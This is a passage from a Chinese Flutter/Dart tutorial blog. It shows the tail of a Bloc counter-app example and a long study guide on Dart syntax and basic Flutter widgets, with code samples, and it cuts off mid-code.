BlocObserver { /// {@macro counter_observer} const CounterObserver(); @override void onChange(BlocBase&lt;dynamic&gt; bloc, Change&lt;dynamic&gt; change) { super.onChange(bloc, change); // ignore: avoid_print print('${bloc.runtimeType} $change'); }} 在这个文件中，我们只重写了 onChange ，用来查看所有产生的状态（state）变化 注意: onChange 在 Bloc 和 Cubit 中发挥的作用是相同的。 # main.dart 接下来，用下面的代码替换 main.dart 里面的内容: 12345678910import 'package:bloc/bloc.dart';import 'package:flutter/widgets.dart';import 'package:flutter_counter/app.dart';import 'package:flutter_counter/counter_observer.dart';void main() { Bloc.observer = const CounterObserver(); runApp(const CounterApp());} 在上面的代码中，我们初始化了之前创建的 CounterObserver 并且通过 runApp 调用我们即将创建的 CounterApp 。 # Counter App 创建 lib/app.dart : CounterApp 是一个 home 是 CounterPage 的 MaterialApp 。 1234567891011import 'package:flutter/material.dart';import 'package:flutter_counter/counter/counter.dart';/// {@template counter_app}/// A [MaterialApp] which sets the `home` to [CounterPage]./// {@endtemplate}class CounterApp extends MaterialApp { /// {@macro counter_app} const CounterApp({super.key}) : super(home: const CounterPage());} 注意: CounterApp 扩展（extends) 自 MaterialApp ，所以在这里它是一个 MaterialApp 。 在大多数的情况下，我们会创建一个 StatelessWidget 或者 StatefulWidget 实例，并且通过 build 来绘制 Widget。但是现在我们并不需要绘制任何 Widget，所以我们直接从 MaterialApp 进行扩展（extends)，这样更简单。 接下来，让我们来看下 CounterPage ! # Counter Page 创建 lib/counter/view/counter_page.dart : CounterPage 是用来创建一个 CounterCubit 实例 (也就是接下来我们要创建的类的实例) 并把它提供给 CounterView 使用。 123456789101112131415161718192021import 'package:flutter/material.dart';import 'package:flutter_bloc/flutter_bloc.dart';import 'package:flutter_counter/counter/counter.dart';/// {@template counter_page}/// A [StatelessWidget] which is responsible for providing a/// [CounterCubit] instance to the [CounterView]./// {@endtemplate}class CounterPage extends StatelessWidget { /// {@macro counter_page} const CounterPage({super.key}); @override Widget build(BuildContext context) { return BlocProvider( create: (_) =&gt; CounterCubit(), child: const CounterView(), ); }} 注意：分离（或者解耦） Cubit 创建部分的代码和 Cubit 使用部分的代码是非常重要的。这样使得代码更容易被测试或者被重复使用。 # Counter Cubit 创建 lib/counter/cubit/counter_cubit.dart : CounterCubit 类将提供两种方法: increment : 给当前状态（state）加 1 decrement : 给当前状态（state）减 1 设置 CounterCubit 状态的数据类型为 int ， 初始值是 0 。 12345678910111213141516import 'package:bloc/bloc.dart';/// {@template counter_cubit}/// A [Cubit] which manages an [int] as its state./// {@endtemplate}class CounterCubit extends Cubit&lt;int&gt; { /// {@macro counter_cubit} CounterCubit() : super(0); /// Add 1 to the current state. void increment() =&gt; emit(state + 1); /// Subtract 1 from the current state. void decrement() =&gt; emit(state - 1);} 小贴士：可以使用 VSCode Extension 或者 IntelliJ Plugin 自动创建新的 Cubit。 接下来我们来写 CounterView ，它将使用 state 并且和 CounterCubit 交互。 # Counter View 创建 lib/counter/view/counter_view.dart : CounterView 是用来绘制计数器上的数字以及两个用于增加和减少数字的 FloatingActionButtons。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import 'package:flutter/material.dart';import 'package:flutter_bloc/flutter_bloc.dart';import 'package:flutter_counter/counter/counter.dart';/// {@template counter_view}/// A [StatelessWidget] which reacts to the provided/// [CounterCubit] state and notifies it in response to user input./// {@endtemplate}class CounterView extends StatelessWidget { /// {@macro counter_view} const CounterView({super.key}); @override Widget build(BuildContext context) { final textTheme = Theme.of(context).textTheme; return Scaffold( appBar: AppBar(title: const Text('Counter')), body: Center( child: BlocBuilder&lt;CounterCubit, int&gt;( builder: (context, state) { return Text('$state', style: textTheme.displayMedium); }, ), ), floatingActionButton: Column( mainAxisAlignment: MainAxisAlignment.end, crossAxisAlignment: CrossAxisAlignment.end, children: &lt;Widget&gt;[ FloatingActionButton( key: const Key('counterView_increment_floatingActionButton'), child: const Icon(Icons.add), onPressed: () =&gt; context.read&lt;CounterCubit&gt;().increment(), ), const SizedBox(height: 8), FloatingActionButton( key: const Key('counterView_decrement_floatingActionButton'), child: const Icon(Icons.remove), onPressed: () =&gt; context.read&lt;CounterCubit&gt;().decrement(), ), ], ), ); }} 用 BlocBuilder 把 Text 包起来，这样每一次 CounterCubit 状态变化的时候里面的文字就会更新。 另外，使用 context.read&lt;CounterCubit&gt;() 来接入 CounterCubit 实例。 注意：只有 Text 需要被 BlocBuilder 包起来，因为这是唯一一个会随着 CounterCubit 状态（state) 变化而变化的组件。请不要包裹任何不随状态（state) 改变而改变的 Widget， 从而避免绘制不必要的组件。 # Barrel 创建 lib/counter/counter.dart : 加入 counter.dart 用来导出所有有关计数器的公共接口。 12export 'cubit/counter_cubit.dart';export 'view/view.dart'; 大功告成！我们已经将表现层（presentation layer）从数据逻辑层（business logic layer）中分离出来。 CounterView 不会知道用户点击按钮的时候发生了什么，它只是通知了 CounterCubit 。 而且， CounterCubit 不会知道状态（也就是计数器的值）是什么， 它只是根据被调用的方法来发出新的状态。 最后，通过执行 flutter run 让我们在真实设备或者模拟器上运行它。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/07/14/%E3%80%90Flutter%E3%80%91Flutter%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E6%A1%86%E6%9E%B6%EF%BC%9ABloc%E7%9A%84%E8%AE%A1%E6%95%B0%E5%99%A8%E5%BA%94%E7%94%A8%E7%A4%BA%E4%BE%8B/"},{"title":"Flutter全网最全学习笔记！","text":"# Flutter 学习文档 —Author：Brath # 欢迎来到 brath 的 CSDN 博客，你也可访问 brath.top 到我的个人博客来进行观看 演示 demo-APK 地址: http://124.222.106.122:8080/app-release.zip # 前言：如果你要学习 flutter，那么你一定要会 dart 语言，因为 flutter 是基于 dart 来封装的一个 UI 组件包 # 本文使用 Typort 书写，禁止转载。 ​ 本文仅限有后端有语言基础（C/C++/C#/Java/python/Golang/PHP 都可以），前端 (JavaScript，Html，CSS) 的人来学习。如果 0 基础，请先学习任意一门后端语言并熟练掌握！ # Dart 语言学习： ​ 安装 Dart：https://github.com/GeKorm/dart-windows/releases/download/v1.6.0/Dart_x64.stable.setup.exe ​ 安装好后配置环境变量：DART_HOME E:\\dart\\bin 安装路径 ​ 配置好后 cmd 输入 dart --version 查看环境 1Dart VM version: 2.3.3-dev.0.0.flutter-b37aa3b036 (Tue Jun 11 13:00:50 2019 +0000) on &quot;windows_x64&quot; # 注释： 12345678910/* *多行注释 *多行注释 */ /** * 文档注释 与Java相同 */ ///文档注释 dart独有 # 变量定义： dart 语言特点： ​ 自动类型转换，var 声明的变量可以是任意类型！ dart 拥有两种变量定义方式。 指定类型： String name = “brath”; 或者 类型推导 var name = “brath”; // 推导为任意类型 final name = “brath”; // 不可修改，定义常量，可以初始化 const name = “brath”; // 不可修改，定义常量，不可以初始化，可以被构造修改 123456789101112void main(){ var name = 111111; String name1 = &quot;brath用类型定义&quot;; print(&quot;Hello World! Brath~&quot;); print(name.runtimeType); print(name1.runtimeType);} console:Hello World! Brath~intString # 变量拼接： 与 Java 不同，拼接方式用 ${} 如果只拼接普通变量，可以直接 $ 变量名 如果拼接变量引用方法，必须要 $ # 集合类型： list 集合： var names = [“111”,“222”,“333”]; set 集合: var movies = {“111”,“222”,&quot;333”}; map 集合：var info = 默认情况下，dart 的所有 class 都是隐式接口！ # Dart 函数使用： 12345678void main(List&lt;String&gt; args) { print(sum(51, 14891));}int sum(int a,int b){ return a + b;} # 函数参数： 必选参数，不能有默认值，可选参数，可以有默认值 1234567891011121314151617181920main(){ sayHello(&quot;why&quot;);}//必选参数：String name 必须传参void sayHello(String name){ print(name)}//可选参数：位置可选参数 void sayHello2(String name, [int age, String desc]){ sayHello2(&quot;brath&quot;,12,&quot;waa&quot;); //位置可选参数：用[]包围的参数可传可不传，但是位置必须对应}//可选参数：命名可选参数 重点，多用！void sayHello3(String name, {int age, String desc}){ sayHello3(&quot;brath&quot;,age: 13,desc: &quot;212&quot;); //位置可选参数：用{}包围的参数可传可不传，但是必须指定参数名} # 函数是一等公民: 函数可以作为另外一个函数的参数！ 1234567891011121314151617181920void main(List&lt;String&gt; args) { // test(see); //匿名函数 // test((){ // print(&quot;匿名&quot;); // return 10; // }); test(() =&gt; print(&quot;箭头&quot;));}void test(Function foo){ see();}void see(){ print(&quot;see！&quot;);} 123456789101112131415161718192021222324252627void main(List&lt;String&gt; args) { // test((num1,num2){ // return num1+num2; // }); var num = demo(); print(num(20,12));}//将函数声明式显示，利用 typedef 声明一个函数列表，调用 typedef 声明的函数typedef Calculate = int Function(int num1,int num2);void test(Calculate calculate){ calculate(20,30);}// void test(int foo(int num1,int num2)){// foo(20,30);// }Calculate demo(){ return (num1,num2){ return num1 * num2; };} # 赋值运算符： 1234567Flutter中，有诡异的赋值运算符比如 name ??=&quot;111&quot;;解释：当原来的变量有值时，不执行当原来的变量为null时，执行或者 var name = name ?? &quot;11&quot;;解释： 当name不为空时使用name，为空使用后面的变量 # 级联运算符： 123456789101112131415161718void main(){ var p = Person() ..name = &quot;brath&quot; ..eat(); ..run();}//利用 .. 连续调用对象中的方法，类似于Java中的链式调用class Person(){ String name; void eat(){ print(&quot;吃&quot;); } void run(){ print(&quot;跑&quot;); }} # For 循环和 Switch 循环与 JS 和 Java 基本一致 # 构造函数： 12345678910class Person{ String name; int age; double height; //默认构造函数 Person(this.name.this.age); //命名构造函数，指定名字的构造函数 Person.NameCon(this.name.this.age,this.height);} # dynamic： 12345678dynamic代表任意类型dynamic obj = &quot;obj&quot;;//可以调用print(obj.subString(1));Object obj = &quot;obj&quot;;//不能调用！print(obj.subString(1)); # 初始化列表： 1234567891011mian(){ var p = Person('brath');}class Person{ final String name; final int age; //如果传了age参数，就用age参数，如果没传age参数就用10 Person(this.name,{int age}): this.age = age ?? 10;} # 构造函数重定向： 123456789101112mian(){ }class Person{ String name; int age; //默认构造函数调用内部构造函数，重定向 Person(String name) : this._internal(name,0); Person._internal(this.name,this.age)} # 工厂构造函数： 12345678910111213141516171819//相比于普通构造函数来说，工厂构造函数可以手动返回对象class Person{ String name; String color; static final Map&lt;String,Person&gt; _nameCache = {}; static final Map&lt;String,Person&gt; _colorCache = {}; //工厂构造函数，手动根据条件返回对象 factory Person.withName(String name){ if(_nameCache.containsKey(name)){ return _nameCache[name]; }else{ _nameCache[name] = Person(name,&quot;default&quot;); return Person(name,&quot;default&quot;); } }} # Getter 和 Setter： 123456789101112131415161718192021222324252627void main(List&lt;String&gt; args) { //直接访问属性 final p = Person(); p.name = &quot;brath&quot;; print(p.name); //get，set访问 p.setName(&quot;brath.cloud&quot;); print(p.getName);}class Person{ late String name; // //get,set方法 // void setName(String name) { // this.name = name; // } // String get getName{ // return name; // } //get,set方法箭头函数 void setName(String name) =&gt; this.name = name; String get getName =&gt; name;} # 隐式接口： 12//dart中没有interface关键字，默认所有类都是隐式接口//当讲将一个类作为接口使用时，实现这个接口的类，必须实现这个接口中的所有方法 # 类的混入： 12用class声明的类不可以混入其他类要混入其他类，使用 mixin 声明该类，并在混入时用with关键字来连接被混入的类 # 类属性和类方法： 1234类属性：在类中不用static声明的变量，叫做成员变量，不可以被类直接调用静态属性：在类中用static声明的变量，叫做静态属性，类属性，可以被类直接调用类方法：在类中不用static声明的方法，叫做成员方法，不可以被类直接调用静态方法：在类中用static声明的方法，叫做静态方法，类属性，可以被类直接调用 # 枚举的使用： 12345678910111213141516171819202122232425void main(List&lt;String&gt; args) { final color = Colors.bule; switch(color){ case Colors.bule: print(&quot;蓝色&quot;); break; case Colors.red: print(&quot;红色&quot;); break; case Colors.yellow: print(&quot;黄色&quot;); break; } print(Colors.values);}enum Colors{ red, bule, yellow} # 库的使用： 12345678910111213//在Dart中，任何一个dart文件都是一个库，类似于Java中的包//系统库导入： import 'dart:库名';//自定会库导入： import '包名/类名';//库别名：当本类引用其他库时，出现方法名冲突，可以用 as 来给导入的库起别名，再用别名引用import 'utils/TimeUtil' as timeUtil;//默认情况下，导入一个库时，导入的是这个库中所有的内容//dart提供两个关键字来单独导入方法或者隐藏某个方法：show hideimport 'utils/TimeUtil' show timeUtil; //只导入timeUtil方法import 'utils/TimeUtil' hide timeUtil; //只有timeUtil不会导入//多个方法可以用逗号分割：import 'utils/TimeUtil' show timeUtil, FileUtil; //只导入timeUtil,FileUtil方法import 'utils/TimeUtil' hide timeUtil, FileUtil; //只有timeUtil,FileUtil不会导入 # 抽取公共库文件： 12345678910 以上方法导入库的时候总是会遇到一些问题，比如如果有100个方法，你只想用50个，那么你就要用50个show或者50个hide，但是dart提供了一种方式，就是抽取库到一个公共类中。 前面提到过，dart中所有文件都是一个库，那么我们把需要导入的库，全部export到一个库中，在引用这个库，就不用担心过多引入了。 公共库：util.dartexport 'util/TimeUtil'export 'util/FileUtil'我的代码：import 'util'; # 使用第三方库： 1//dart使用第三方库需要创建一个文件 pubspec.yaml 123456name: 库名desciption: 描述dependencies: 依赖 http: ^0.13.4怎么找库？https://pub.dev/packages/http 点击 installing 把 dependencies 内容复制到代码中 123456name: coderwhydesciption: a dartdependencies: http: ^0.12.0+4environment: sdk: '&gt;=2.10.0 &lt; 3.0.0' 进入当前类文件夹，终端输入 pub get 就会下载对应库包 123456789import 'package:http/http.dart' as http;//引入第三方库，必须用package来开头void main() async { var url = 'https://www.brath.cloud:9000/esn-user-service/user/getUserInfo?id=1'; var url2 = 'https://brath.cloud/image/back.png'; var response = await http.get(url); print(response.body);} # 异常处理： ​ 与 Java 相同但是有不一样的部分： ​ 同步处理 ​ 在一个方法中用 try 捕获异常，如果调用方法就捕获不到了！ ​ 异步处理 ​ 调用一个异步方法如果发生异常，可以用自异步 + await 来捕获异常 123456789101112void main() async{ try{ await test1(); }catch(e){ print(e); }} test1() async{ print(11~/0);} # 接下来介绍 我们的 Flutter！ # 最好的跨平台解决方案 Flutter 架构对比： # GUP 绘制出图像，放到 Buffer 缓存中，手机屏幕根据刷新率来读取缓存的操作，就是展示图像。 # 引出了一个概念：垂直同步 ​ 为什么要有垂直同步？ ​ 来看一个例子：假设我 GPU 每秒帧率产生 60，手机屏幕每秒也是接受 60，这时可以正常显示。 ​ 如果突然每秒帧率提高到 120，手机屏幕可能会来不及读取缓存导致画面重叠、撕裂 ​ 开启垂直同后，会有两块缓存区域。 ​ 垂直同步就限制了手机屏幕读取缓存和 GPU 产生的速度，开启垂直同步后，GPU 将画面写入到第一个缓存中，第一个缓存会复制内容（地址交换）到第二个缓存中，当两份缓存都存在这一帧，就会发送一个 VSync 的信号，告诉 GPU 可以绘制下一张图，然后手机屏幕来显示第二个缓存中的内容，这样就可以避免图像撕裂。 # 一个简单的 flutter 结构： 12345678910111213141516171819202122232425262728293031323334353637383940import 'package:flutter/material.dart';// mian() =&gt; runApp(MyApp());void main() { runApp(const MyApp());}//APP主体class MyApp extends StatelessWidget{ @override Widget build(BuildContext context) { return MaterialApp( home: BrathScaffoldPage() ); }}//页面主体class BrathScaffoldPage extends StatelessWidget{ @override Widget build(BuildContext context) { return Scaffold( //appbar：顶部标签主体 appBar: AppBar( centerTitle: true, title: Text(&quot;第一个Fullter程序&quot;,style: TextStyle(fontSize: 20),), ), body: BrathBodyPage() ); }}//内容主体class BrathBodyPage extends StatelessWidget{ @override Widget build(BuildContext context) { return Text(&quot;Hello Fullter&quot;); }} # 开始学习： # 下载 Flutter SDK 配置 Flutter 的第一步就是下载 Flutter SDK，然后进行安装，上面两个地址都有给 SDK 下载地址，这里的问题是有的 SDK 安装包有时会报 没有.git 文件的错误，所以最稳妥的方法是通过 git clone 命令安装 在安装目录下面执行 1git clone -b stable https://github.com/flutter/flutter.git 安装完成之后，可以在安装根目录，找的 flutter_console.bat 文件，双击运行 # 配置 Flutter 运行环境变量 在用户变量里面编辑或者添加 Path 条目，把 Flutter 的 bin 目录路径添加在里面 # 运行 Flutter 在命令行运行 flutter doctor，它会下载它自己的依赖项并自行编译，一般情况是会报错提示，多半是 Android SDK 找不到什么的，如果出错了，就按照错误信息网上查一下就解决了。 我的已经处理完成的 # 编辑器设置 我用的 Android Studio，上面连接里面有不同系统和编辑器的流程，详情可以前往查看 Android Studio 的开发环境就不说了，需要的可以自行百度。Android Studio 配置 Flutter 开发主要是 Flutter 和 Dart 两个插件 File – Settings – Plugins – Marketplace 然后在搜索里面搜索 Flutter 和 Dart 安装就可以了。 安装完插件，重启一下 Android Studio 基本就配置完成了，可以新建 Flutter 项目了。 # 新建 Flutter 项目 File – New – New Flutter Project 选择 Flutter Application 然后到这个最后一步的时候，会有一点小问题 Flutter SDK path 这一栏第一次默认是空的，需要手动选择，选择我们最开始下载的 Flutter SDK，选择根目录，就可以了 # 至此 Flutter 的开发环境安装完毕！ # 现在开始学习 Flutter 的基础组件，以及进阶理论！ # flutter 学习笔记 auther：Brath # 所有的重点都在代码的注释中标注！ # 创建项目： ​ 到想存储项目的文件路径，打开 CMD，输入 flutter create 项目名称即可 ​ vscode 下载好插件，dart 和 flutter 打开对应 flutter 文件，即可开始编写 1234567891011121314import 'package:flutter/material.dart'; //导包 materialmain() { runApp(MyApp()); //运行app}class MyApp extends StatelessWidget { //继承无状态widget @override Widget build(BuildContext context) { return MaterialApp( //运行根节点MaterialApp ); }} # Widget：flutter 模块 / 组件 # 特性： # widget 分为有状态（StatefulWidget）和无状态的 (StatelessWidget) 无状态的 widget 是静态页面 有状态的 widget 是动态页面 # 要点： # tips：flutter 的 main 入口调用第一个 widget 需要该 widget 使用 MaterialApp () 作为首个 widget 因为 MaterialApp 包含了路由主题等等组件，flutter 规定只能用 MaterialApp 当作根节点 # 使用 MaterialApp 的 home 属性来指定页面 123456789class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { return MaterialApp( debugShowCheckedModeBanner: false, home: HomePage(), ); }} # Container 容器（相当于 DIV）(widget)：下面有更详细的介绍 均为可选参数 12345678910111213141516171819202122232425262728293031Container({ Key? key, this.alignment, this.padding, //边距 this.color, //颜色 使用 Clolrs枚举 this.decoration, //描述 this.foregroundDecoration, double? width, //宽度 使用double 常量 double? height, //高度 使用double 常量 BoxConstraints? constraints, this.margin, //margin this.transform, this.transformAlignment, this.child, //子组件 this.clipBehavior = Clip.none, }) : assert(margin == null || margin.isNonNegative), assert(padding == null || padding.isNonNegative), assert(decoration == null || decoration.debugAssertIsValid()), assert(constraints == null || constraints.debugAssertIsValid()), assert(clipBehavior != null), assert(decoration != null || clipBehavior == Clip.none), assert(color == null || decoration == null, 'Cannot provide both a color and a decoration\\n' 'To provide both, use &quot;decoration: BoxDecoration(color: color)&quot;.', ), constraints = (width != null || height != null) ? constraints?.tighten(width: width, height: height) ?? BoxConstraints.tightFor(width: width, height: height) : constraints, super(key: key); # Text 文本组件 (widget)： Text 默认传一个文本： 12345678910111213141516171819class TextDemo extends StatelessWidget @override Widget build(BuildContext context) { return Container( //容器 width: double.infinity, //宽度 使用double枚举 color: Colors.blue, //颜色 使用Colors枚举 child: Text( //容器的子组件 文本组件 &quot;文本&quot; * 20, //输入文本 20个 maxLines: 1, //最大行数 1 textDirection: TextDirection.ltr, //从左到右 textAlign: TextAlign.center, //剧中 style: TextStyle( //设置文本样式 fontSize: 30, //字体大小 30 color: Colors.teal //字体颜色 ), ) ); }} 123456789101112131415161718192021222324const Text( //必传参数 String this.data, //可选参数 { Key? key, this.style, //文本风格，使用 TextStyle方法来指定 this.strutStyle, this.textAlign, //设置文本居中 靠左 靠右，使用 TextAlign枚举 this.textDirection, //文本排列：左到右 右到左 使用 TextDirection枚举 this.locale, this.softWrap, this.overflow, //溢出后按照什么风格显示，使用TextOverflow的枚举 this.textScaleFactor, this.maxLines, //最大行数 this.semanticsLabel, this.textWidthBasis, this.textHeightBehavior, }) : assert( data != null, 'A non-null String must be provided to a Text widget.', ), textSpan = null, super(key: key); # Button 按钮组件 (widget)： flutter 中有几种常用按钮组件： 在 2.0 版本后遗弃按钮 RaisedButton 改为 ElevatedButton ， FlatButton 改为 TextButton 12RaisedButton 已遗弃FlatButton 已遗弃 # ElevatedButton：漂浮按钮 / 升降按钮 1234567891011121314151617class ButtonDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Column( children: [ ElevatedButton( onPressed:(){ //点击事件，如果为null未定义的话，按钮无法点击 }, child: Text( //这里是按钮文本，可以是图片可以是文本 &quot;漂浮按钮&quot; ) ) ], ); }} # TextButton：扁平按钮 / 文本按钮 1234567891011121314151617class ButtonDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Column( children: [ TextButton( onPressed: (){ //点击事件 }, child: Text( &quot;扁平按钮&quot; )) ], ); }} # TextButton.icon：带图标的扁平按钮 / 文本按钮 12345678910111213class ButtonDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Column( children: [ TextButton.icon(onPressed: (){}, icon: Icon(Icons.add), //使用Icons枚举选择图标 label: Text(&quot;图标按钮&quot;)) ], ); }} # OutlinedButton.icon：无阴影按钮 123456789101112class ButtonDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Column( children: [ OutlinedButton(onPressed: (){}, child: Text(&quot;无阴影按钮&quot;)) ], ); }} # OutlinedButton.icon：图标按钮 1234567891011class ButtonDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Column( children: [ IconButton(onPressed: (){}, icon: Icon(Icons.home)) //图标用 Icons 枚举选择 ], ); }} # Image 图片、图标组件 (widget)： flutter 提供了四种图片加载方式： 1、Image.network // 从网络获取图片 2、Image.asset // 从项目本地获取图片 3、Image.file // 从文件路径获取图片 4、Image.memory // 从手机内存，存储中获取图片 使用 asset 需要设置 pubspec.yaml 中的 assets 12345678910111213141516171819class ImageIconDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Column( children: [ Icon(Icons.home), //普通图标 IconButton(onPressed: (){}, icon: Icon(Icons.home)), //带点击事件的图标 Container( width: double.infinity, //最大宽度 child: Image.network( //从网络获取图片 &quot;https://brath.cloud/love/GCLK6888.JPG?versionId=CAEQNxiBgID8yJjchBgiIDUzZGFiMWU3YWVlNDQ4YmJhMzMwNDY0Mzk1OGJiOTU1&quot;, fit: BoxFit.fill, //图片填充模式 ), ), Image.asset(&quot;images/image.jpeg&quot;), //项目加载图片 ], ); }} # Switch 开关，CheckBox 复选框组件 (widget)： 因为开关和复选框是动态的，有状态的，所以我们要使用 StatefulWidget 来做他们的 widget 1//Tips：在 onChanged 使用 setState 来改变状态 Check 复选框 123456789101112131415161718192021class CheckDemo extends StatefulWidget { @override State&lt;CheckDemo&gt; createState() =&gt; _CheckDemoState();}class _CheckDemoState extends State&lt;CheckDemo&gt; { bool _check = false; @override Widget build(BuildContext context) { return Column( children: [ Checkbox( value: _check, onChanged: (res){ //在 onChanged 使用 setState 来改变状态 setState(() { _check = res!; }); }), ], ); }} Switch 开关 123456789101112131415161718192021class CheckDemo extends StatefulWidget { @override State&lt;CheckDemo&gt; createState() =&gt; _CheckDemoState();}class _CheckDemoState extends State&lt;CheckDemo&gt; { bool _switch = false; @override Widget build(BuildContext context) { return Column( children: [ Switch( value: _switch, onChanged: (res){ //在 onChanged 使用 setState 来改变状态 setState(() { _switch = res; }); }) ], ); }} # Progress 进度条，指示器组件 (widget)： flutter 为我们提供了几种进度条和指示器样式 1、LinearProgressIndicator 线性指示器 2、CircularProgressIndicator 圆圈指示器 3、CupertinoActivityIndicator IOS 风格的进度指示器 可以设置的参数： value：可以设置 0 - 1，来表示当前进度 valueColor：使用 AlwaysStoppedAnimation (Colors.red) 动画包裹颜色设置进度指示器的颜色 1234567891011121314151617181920212223242526class ProgressDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Padding( padding: EdgeInsets.all(10), child: Column( children: [ LinearProgressIndicator( //线性指示器 value: .5, //进度 从0-1， .5就是一半 valueColor: AlwaysStoppedAnimation(Colors.red), //设置颜色要用动画包裹 ), SizedBox(height: 16), //设置间隔 16 Container( //设置容器 height: 100, //高 100 width: 100, //宽 100 child: CircularProgressIndicator( //圆圈指示器 // value: .8, valueColor: AlwaysStoppedAnimation(Colors.red), ), ), SizedBox(height: 16), CupertinoActivityIndicator(), //IOS风格的进度指示器 ]), ); }} # Click 点击组件 (widget)： flutter 为我们提供了 GestureDetector 手势检测器 1234567891011121314class ClickDemo extends StatelessWidget { @override Widget build(BuildContext context) { return GestureDetector( //创建手势检测器 onTap: (){ //单击 print(&quot;点击&quot;); }, onDoubleTap: (){ //双击 print(&quot;双击&quot;); }, child: Text(&quot;点击组件&quot;), ); }} # Input 输入框组件 (widget)： flutter 为我们提供了两种常用输入组件： TextField：默认典型输入框，没有 validator 验证 TextFromField：特点是可以带参数校验 validator 一般用于登录注册表单验证 # TextField 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061const TextField({ Key? key, this.controller, //控制器 this.focusNode, //焦点 this.decoration = const InputDecoration(), //装饰器 TextInputType? keyboardType, this.textInputAction, //输入动作 键盘右下角（完成，搜索，下一行） this.textCapitalization = TextCapitalization.none, this.style, //样式 this.strutStyle, this.textAlign = TextAlign.start, //文本格式 默认从左开始 this.textAlignVertical, this.textDirection, //文本方向 this.readOnly = false, ToolbarOptions? toolbarOptions, this.showCursor, this.autofocus = false, this.obscuringCharacter = '•', this.obscureText = false, this.autocorrect = true, SmartDashesType? smartDashesType, SmartQuotesType? smartQuotesType, this.enableSuggestions = true, this.maxLines = 1, //最大行数 this.minLines, //最小行数 this.expands = false, this.maxLength, //最大字数 @Deprecated( 'Use maxLengthEnforcement parameter which provides more specific ' 'behavior related to the maxLength limit. ' 'This feature was deprecated after v1.25.0-5.0.pre.', ) this.maxLengthEnforced = true, this.maxLengthEnforcement, this.onChanged, //当值改变 this.onEditingComplete, this.onSubmitted, this.onAppPrivateCommand, this.inputFormatters, this.enabled, this.cursorWidth = 2.0, this.cursorHeight, this.cursorRadius, this.cursorColor, this.selectionHeightStyle = ui.BoxHeightStyle.tight, this.selectionWidthStyle = ui.BoxWidthStyle.tight, this.keyboardAppearance, this.scrollPadding = const EdgeInsets.all(20.0), this.dragStartBehavior = DragStartBehavior.start, this.enableInteractiveSelection = true, this.selectionControls, this.onTap, this.mouseCursor, this.buildCounter, this.scrollController, this.scrollPhysics, this.autofillHints = const &lt;String&gt;[], this.clipBehavior = Clip.hardEdge, this.restorationId, this.enableIMEPersonalizedLearning = true, }) # TextFromField 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758Key? key, this.controller, String? initialValue, FocusNode? focusNode, InputDecoration? decoration = const InputDecoration(), TextInputType? keyboardType, TextCapitalization textCapitalization = TextCapitalization.none, TextInputAction? textInputAction, TextStyle? style, StrutStyle? strutStyle, TextDirection? textDirection, TextAlign textAlign = TextAlign.start, TextAlignVertical? textAlignVertical, bool autofocus = false, bool readOnly = false, ToolbarOptions? toolbarOptions, bool? showCursor, String obscuringCharacter = '•', bool obscureText = false, bool autocorrect = true, SmartDashesType? smartDashesType, SmartQuotesType? smartQuotesType, bool enableSuggestions = true, @Deprecated( 'Use maxLengthEnforcement parameter which provides more specific ' 'behavior related to the maxLength limit. ' 'This feature was deprecated after v1.25.0-5.0.pre.', ) bool maxLengthEnforced = true, MaxLengthEnforcement? maxLengthEnforcement, int? maxLines = 1, int? minLines, bool expands = false, int? maxLength, ValueChanged&lt;String&gt;? onChanged, GestureTapCallback? onTap, VoidCallback? onEditingComplete, ValueChanged&lt;String&gt;? onFieldSubmitted, FormFieldSetter&lt;String&gt;? onSaved, FormFieldValidator&lt;String&gt;? validator, //与TextFiled不同的点，增加了 validator验证方法 List&lt;TextInputFormatter&gt;? inputFormatters, bool? enabled, double cursorWidth = 2.0, double? cursorHeight, Radius? cursorRadius, Color? cursorColor, Brightness? keyboardAppearance, EdgeInsets scrollPadding = const EdgeInsets.all(20.0), bool enableInteractiveSelection = true, TextSelectionControls? selectionControls, InputCounterWidgetBuilder? buildCounter, ScrollPhysics? scrollPhysics, Iterable&lt;String&gt;? autofillHints, AutovalidateMode? autovalidateMode, ScrollController? scrollController, String? restorationId, bool enableIMEPersonalizedLearning = true, }) 简易登录 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475class InputDemo extends StatefulWidget { //创建有状态 widget @override State&lt;InputDemo&gt; createState() =&gt; _InputDemoState();}class _InputDemoState extends State&lt;InputDemo&gt; { GlobalKey _key = GlobalKey&lt;FormState&gt;(); //key的泛型是表单状态，这样就可以通过key提交 TextEditingController _rootController = TextEditingController();//账号控制器 TextEditingController _passController = TextEditingController();//密码控制器 FocusNode _r = FocusNode(); //账号焦点 FocusNode _p = FocusNode(); //密码焦点 //当退出时销毁controller，否则占用内存 @override void dispose() { super.dispose(); //销毁父类 _rootController.dispose(); //销毁 _passController.dispose(); //销毁 _r.dispose(); //销毁 _p.dispose(); //销毁 } @override Widget build(BuildContext context) { return Form( //构建表单 key: _key, //构建表单提交key child: Column( children: [ TextFormField( //构建表单输入框 autofocus: true, //默认焦点聚集 focusNode: _r, //账号焦点 controller: _rootController, //引用账号控制器 decoration: InputDecoration( //输入框描述 prefixIcon: Icon(Icons.add), //输入框图标 labelText: &quot;账号&quot;, //输入框标题 hintText: &quot;默认文字&quot; //输入框默认value ), validator: (v){ //只有使用 TextFormField 才可以用验证 validator 不用验证使用 TextField if(v == null || v.isEmpty){ return &quot;账号不能为空!&quot;; } }, textInputAction: TextInputAction.next, //回车后跳转下个输入框 onFieldSubmitted: (v){ //监听回车键 print(&quot;brath&quot;); }, ), SizedBox(height: 8), //设置间隔高度 TextFormField( focusNode: _p, //密码焦点 controller: _passController, decoration: InputDecoration( prefixIcon: Icon(Icons.add), labelText: 